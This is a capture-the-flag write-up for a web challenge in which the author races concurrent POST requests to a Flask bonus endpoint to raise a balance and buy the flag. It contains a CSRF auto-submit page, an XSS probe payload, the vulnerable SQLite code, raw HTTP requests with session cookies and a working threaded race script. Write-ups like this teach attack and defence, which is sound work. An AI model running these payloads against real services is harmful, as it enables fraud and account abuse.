# Straightforward

**Easy**

Test out our game center. You'll have free claiming bonus for first timers!

*Author: vicevirus ** **Flag format: UMCS{...}**

[http://159.69.219.192:7859/](http://159.69.219.192:7859/)

The challenge required a balance of $3000 to redeem a flag, but each user started with only $1000. The daily bonus system added $1000 more, totaling just $2000—still $1000 short of the goal.

---

The dashboard offered three actions:

- **Collect Daily Bonus**: A `POST` form to `/claim`
- **Redeem Secret Reward ($3000)**: A `POST` form to `/buy_flag`
- **Logout**: A `GET` form to `/logout`

Attempting to buy the flag via `/buy_flag` resulted in a redirect to `/dashboard` with a flash message:

> “Insufficient funds to redeem the reward.”
> 

This confirmed that I needed $3000 in my account, $1000 more than what I could normally accumulate.

---

### CSRF Vulnerability: A Dead End

I noticed the website relied solely on HTTP cookies to identify users, making it vulnerable to **Cross-Site Request Forgery (CSRF)**. Here’s how I explored that path:

![7f2998c0-4319-442b-963d-e91c4c5b7051](https://github.com/user-attachments/assets/524dcb00-9e93-46c7-b248-48a92f2dd2a5)

![image](https://github.com/user-attachments/assets/c40228a1-b845-4209-80d2-fcb3462fcca2)

### **First Attempt: CSRF on `/claim`**

I hypothesized I could trick other users into claiming their daily bonus and somehow redirect the funds to my account.

Example request:

```php
POST /claim HTTP/1.1
Host: 159.69.219.192:7859
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Cookie: session=eyJ1c2VybmFtZSI6InNveXJpYSJ9...
```

The request had no body and relied on the session cookie. I created a malicious HTML page to force other users to unknowingly trigger the request:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://159.69.219.192:7859/claim" method="POST">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Unfortunately, the bonus was credited to the victim's account not mine as the server used the session cookie to identify the recipient.

### **Second Attempt: Parameter Injection**

I tried modifying the form to include a `username` parameter:

```html
<input type="hidden" name="username" value="attacker">
```

I even tried variations like `user=attacker`, `recipient=attacker`, and `claim_for=attacker`, but all were ignored. The server exclusively trusted `session['username']`. Thus, CSRF alone couldn’t redirect funds.

### XSS Exploration

While exploring, I noticed reflected input in the `username` parameter on `/dashboard`. Example:

```
GET /dashboard?username=soyriavypu57uu4k
```

Returned:

```html
<h2>Hello, soyriavypu57uu4k</h2>
```

I tested for **XSS** with:

```html
/dashboard?username="><script>alert('xss')</script>
```

But input was either encoded or blocked by the browser due to `HttpOnly` cookies. XSS wasn't exploitable here.

---

### Discovering Project Files & Race Conditions

Halfway through, I accessed the project codebase and identified two critical vulnerabilities:

1. **IDOR in `dashboard`**:
    
    ```python
    display_user = request.args.get('username') or session['username']
    ```
    
    This meant appending `?username=target_user` allowed me to view any user's balance. While helpful for recon, it didn’t help me increase *my* balance.
    
2.  **Race Condition in `/claim`**
    
    The real goldmine was a **race condition** caused by poor SQLite handling:
    
    The code used:
    
    ```python
    def get_db():
        if 'db' not in g:
            g.db = sqlite3.connect(DATABASE, check_same_thread=False)
            g.db.row_factory = sqlite3.Row
        return g.db
    
    def claim():
        if 'username' not in session:
            return redirect(url_for('register'))
        username = session['username']
        db = get_db()
        cur = db.execute('SELECT claimed FROM redemptions WHERE username=?', (username,))
        row = cur.fetchone()
        if row and row['claimed']:
            flash("You have already claimed your daily bonus!", "danger")
            return redirect(url_for('dashboard'))
        db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
        db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
        db.commit()
        flash("Daily bonus collected!", "success")
        return redirect(url_for('dashboard'))
    ```
    
    - **`check_same_thread=False`** for SQLite
    - No locking
    - No transaction wrapping for the check-update process
    
    This allowed concurrent POSTs to **`/claim`** to bypass the daily bonus limit.
    

### Exploiting the Race Condition

I wrote a simple Python script to send multiple concurrent requests:

```python
import requests
import threading

url = "http://159.69.219.192:7859/claim"
cookies = {"session": "eyJ1c2VybmFtZSI6InNmYWRhZGRzYWQifQ.Z_oEBg.Lfs9yLumisWCZMvNsIN8ofeEx08"}

def send_claim():
    response = requests.post(url, cookies=cookies)
    print(response.text)

threads = []
for _ in range(10):  # Send 10 concurrent requests
    t = threading.Thread(target=send_claim)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

After execution, I checked `/dashboard` and saw my balance jump to **6000 units** confirming multiple bonuses were granted before the server marked the daily claim as complete.

![image 1](https://github.com/user-attachments/assets/a0c2b878-751d-4739-bef7-401bd10e83b0)

![image 2](https://github.com/user-attachments/assets/c7281081-20ee-4ce4-9700-68a2b084809c)


### Buying the Flag

- With enough funds, I sent:

```php
POST /buy_flag HTTP/1.1
Host: 159.69.219.192:7859
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://159.69.219.192:7859
Connection: keep-alive
Referer: http://159.69.219.192:7859/dashboard
Cookie: session=eyJ1c2VybmFtZSI6ImRhc2RhZGF3ZGFzZCJ9.Z_ytuA.PIGnlrnvTZaipYwCne8B3BektPI
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

- The response contained the flag: `UMCS{...}`
    
![image 3](https://github.com/user-attachments/assets/300424ac-d985-41c3-9651-21f2c767b69b)

    
  ## Why CSRF Failed?
    
  - The server correctly tied bonus credit to the authenticated user in the session. Without a server-side flaw, CSRF couldn’t reroute bonuses.
    
### IDOR’s Role
    
  - It only revealed balances and was good for recon but useless for escalation.
    
### Race Condition Insight
    
  - The lack of atomic transactions and poor SQLite handling allowed me to bypass balance restrictions and exploit the logic race.
